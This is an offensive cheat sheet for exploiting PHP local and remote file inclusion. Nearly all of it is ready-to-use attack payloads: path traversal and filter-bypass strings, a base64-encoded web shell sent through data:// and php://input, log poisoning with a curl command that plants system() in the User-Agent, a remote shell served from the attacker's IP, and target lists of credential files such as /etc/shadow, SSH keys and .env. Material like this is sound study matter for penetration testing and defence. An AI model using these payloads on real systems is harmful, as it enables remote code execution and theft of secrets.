LFI / RFI (File Inclusion) - Cheat Sheet

Abuse a parameter that loads a file by path so you can read arbitrary local
files (LFI) or include a remote file (RFI) - and, via log poisoning, wrappers,
or session files, turn file reading into code execution.
Replace the placeholders (<...>) with your own values.


Step 1 - Spot inclusion params

Params that name a page/file/template: ?page= ?file= ?include= ?template=
?lang= ?view= ?doc= ?path=. Values that look like file.php / en / home.


Step 2 - Confirm LFI (read a known file)

    ?page=/etc/passwd
    ?page=../../../../etc/passwd            # climb out of the web root
    ?page=....//....//....//etc/passwd      # bypass one round of ../ stripping
    Windows:  ?page=C:\Windows\win.ini  /  ?page=../../../../windows/win.ini

If the app appends .php, break it (varies by version/config):
    ?page=/etc/passwd%00        (null byte - PHP < 5.3.4)
    ?page=/etc/passwd%23  / ?  / add path truncation


Step 3 - PHP wrappers (read source & run code)

    # read PHP source base64-encoded (see the code, find secrets):
    ?page=php://filter/convert.base64-encode/resource=index.php
    # then base64 -d the output

    # execute PHP you supply (if allow_url_include=On):
    ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&c=id
    ?page=php://input   (POST body = <?php system($_GET[c]); ?>)   &c=id
    # expect wrapper (needs zip/phar upload):
    ?page=zip://shell.zip%23shell.php     ?page=phar://shell.phar/x


Step 4 - LFI -> RCE without wrappers

Log poisoning - inject PHP into a log the app will include:

    # 1) poison the User-Agent (Apache/nginx access log):
    curl http://<target>/ -A '<?php system($_GET[c]); ?>'
    # 2) include the log and run commands:
    ?page=/var/log/apache2/access.log&c=id
    # other sinks: /var/log/nginx/access.log, auth.log (via ssh user=<?php...?>),
    #              /proc/self/environ, PHP session files (/var/lib/php/sessions/sess_<id>),
    #              /var/mail/<user> (SMTP), uploaded avatar/file paths


Step 5 - RFI (include a remote file - rarer)

Requires allow_url_include=On. Host your payload and include it:

    # attacker: python3 -m http.server 80  (serving shell.txt with PHP inside)
    ?page=http://<your-ip>/shell.txt
    ?page=http://<your-ip>/shell.txt%00       # if extension appended
    # payload shell.txt:  <?php system($_GET['c']); ?>   then &c=id


Step 6 - Useful reads & escalation

    /etc/passwd  /etc/hosts  /etc/shadow(if root)  /home/<user>/.ssh/id_rsa
    /var/www/html/config.php  .env  wp-config.php   # DB creds / secrets
    /proc/self/cmdline  /proc/self/environ
    Windows: C:\inetpub\wwwroot\web.config  \Windows\System32\drivers\etc\hosts

Wordlist for automated LFI hunting: LFISuite / ffuf with
    /usr/share/seclists/Fuzzing/LFI/*.txt


Filter bypass cheats
    ../  stripped once -> ....//   or  ..%2f  or  ..%252f (double URL-encode)
    absolute-path filter -> leading ../ still works from web root
    extension appended -> php://filter, %00 (old PHP), or path truncation


Key idea: file inclusion lets you control which file the server loads. Read-only
LFI already leaks source, configs, and keys; but the real prize is code
execution - reached by php://filter (read source) plus a wrapper (data://,
php://input) or by poisoning a file you can write to (logs, sessions) and then
including it. RFI is the easy win when allow_url_include is on. Fix: never build
include paths from user input; use an allowlist of page names.
